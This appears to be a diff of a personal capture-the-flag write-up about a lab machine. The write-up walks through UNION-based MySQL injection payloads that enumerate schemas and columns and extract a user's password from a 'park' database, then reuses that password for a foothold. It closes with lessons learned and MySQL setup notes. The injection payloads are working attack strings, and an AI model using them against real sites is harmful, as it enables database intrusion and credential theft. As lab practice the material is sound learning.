@@ -129,6 +129,8 @@ Stopped at - https://www.youtube.com/watch?v=EqUJxKQzaSM 1:26:49 as I want try t
 	- Set a timer - SQL injections are always time consuming and at very extremely time consuming  
 	- Prospective - e.g MSSQL EXEC xp_cmdshell funtimes
 
+At this point I just went from `ls -1tr Screenshots` and figured it out be screenshot what was going on - going naming convention for Screenshots helped as they do
+
 
 ```sql
 1+UNION+ALL+SELECT+NULL,NULL,NULL,NULL,concat(schema_name)+FROM+information_schema.schemata 
@@ -214,11 +216,15 @@ No USER field..
 ![](nouserfield.png)
 
 Checking Dennis
-![](checkingfordennis.png)![]()
-![]()
+![1080](checkingfordennis.png)
+
+```sql
+1+UNION+ALL+SELECT+NULL,current_user(),version(),NULL,(SELECT+password+FROM+park.users+WHERE+id=2)
+```
+
 ## Foothold
 
-
+And Dennis uses the same password so...
 ![](dennisreallyreallylikepasswordreuse.png)
 
 ## Privilege Escalation
@@ -228,11 +234,13 @@ Checking Dennis
 
 ![](weirdflagcheckwriteup.png)
 
-For second flag or it is just in the Mysql database or config.php
+For second flag or it is just in the Mysql database or config.php - Happy that I no AIed that hitting on of my big objectives for 2023 was more Regexs. Sadly I did not need it...
 ```bash
 grep -r -e 'flag2.([a-zA-Z0-9]){20,}' / 2>/dev/null
 ```
 
+CTFs are CTFs and checking the other user directory will help given that one is scroll up flag... 
+![](outputcutfor2flago.png)
 ## Post-Root-Reflection  
 
 AI is weird using it effectively without becoming a question slave is question in and of itself.
@@ -244,7 +252,18 @@ Key takeaways
 - group_concat() 
 	- must be placed at the dn of a query as it is a aggregate function
 	- you cannot use the result of `GROUP_CONCAT()` for the `IN` operator
-
+- What is the website doing functionally with components on the same network or server or external dependencies?
+	- Understand the situation part 0!!
+- Understand the situation part 1 - Play guess the non-parameterise SQL query
+- Be methodologically and read output
+- The methodology that works from actual professionals and experts sometimes is not going to just going to work on CTFs
+- Understand the situation part 2 - You may not need logic or quotes 
+- Start small as possible
+- Build queries up slowly
+- Before diving down the payload rabbit hole of what works:
+	- Objectives - MAKE A BIG NOTE TO PREVENT THE MENTAL RABBITHOLES
+	- Set a timer - SQL injections are always time consuming and at very extremely time consuming  
+	- Prospective - e.g MSSQL EXEC `xp_cmdshell` fun times
 
 Things that worked - URL decode
 
@@ -255,13 +274,14 @@ Things that worked - URL decode
 
 -- Do not need the Database name
 1+UNION+ALL+SELECT+NULL,NULL,version(),NULL,group_concat(column_name)+FROM+information_schema.columns+where+table_name="users"
+
+
+1+UNION+ALL+SELECT+NULL,current_user(),version(),NULL,(SELECT+password+FROM+park.users+WHERE+id=2)
 ```
 
 
 https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/
 ## Beyond Root
-
-
 
 Phind says this
 - If there are multiple tables named "users" in different schemas, the query will return metadata from all of them. [dba.stackexchange](https://dba.stackexchange.com/questions/204300/select-all-columns-with-same-name-from-different-tables) - [PHIND](https://www.phind.com/search?cache=jqnuad8tect3yp2nsk6sbr45)
@@ -305,23 +325,19 @@ async function play() {
 https://ubuntu.com/server/docs/databases-mysql
 
 ```bash
-
 apt install mysql-server
 
 ss -tap | grep mysql && echo "" && service mysql status
-
 
 
 service mysql restart
 journalctl -u mysql
 
 cat /etc/mysql/mysql.conf.d/mysqld.cnf 
-# change the bind address to something sensible
+# change the bind address to something sensible, it will by default listnen on 127.0.0.1:3306 and :33060
 bind-address = 192.168.0.5
 
-
 systemctl restart mysql.service
-
 ```
 
 Dump a database with legitimate `mysqldump` or use `pv` or pipeviewer
